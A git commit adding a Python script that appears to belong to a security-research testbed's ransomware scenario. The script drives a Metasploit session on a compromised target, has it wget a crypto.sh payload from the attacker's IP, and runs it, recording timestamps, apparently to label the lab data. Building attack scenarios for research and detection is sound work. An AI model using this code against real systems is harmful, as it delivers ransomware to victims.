9ce697e90c6d3263856a8ad534c48ed36885f42d
AlexHchs <88889955+AlexHchs@users.noreply.github.com>
2022-07-27 15:25:38 +0800

    Add files via upload

---
+++ CREME_backend_execution/scripts/02_scenario/03_ransomware/python_files/attacker_server/07_step_Ransomware.py
@@ -0,0 +1,41 @@
+import time
+import sys
+import os
+from pymetasploit3.msfrpc import MsfRpcClient
+
+
+def record_timestamp(folder, output_time_file):
+    output_time_file = os.path.join(folder, output_time_file)
+    with open(output_time_file, "w+") as fw:
+        fw.write('%f' % time.time())
+
+
+def main(argv):
+    if len(argv) != 4:
+        print("Usage: {} Folder local_ip target_ip".format(argv[0]))
+
+    folder = argv[1]
+    my_ip = argv[2]
+    target_ip = argv[3]
+
+    client = MsfRpcClient('kali')
+
+    # start step 7
+    output_time_file = 'time_step_7_start.txt'
+    record_timestamp(folder, output_time_file)
+    time.sleep(2)
+
+    shell = client.sessions.session('4')
+    shell.write('wget --no-check-certificate http://{0}/downloads/crypto.sh'.format(my_ip))
+    shell.write('chmod 755 ./crypto.sh')
+    shell.write('timeout 60s ./crypto.sh &')
+
+    while client.jobs.list:
+        time.sleep(1)
+
+    time.sleep(10)
+    output_time_file = 'time_stage_7_end.txt'
+    record_timestamp(folder, output_time_file)
+    time.sleep(2)
+
+main(sys.argv)
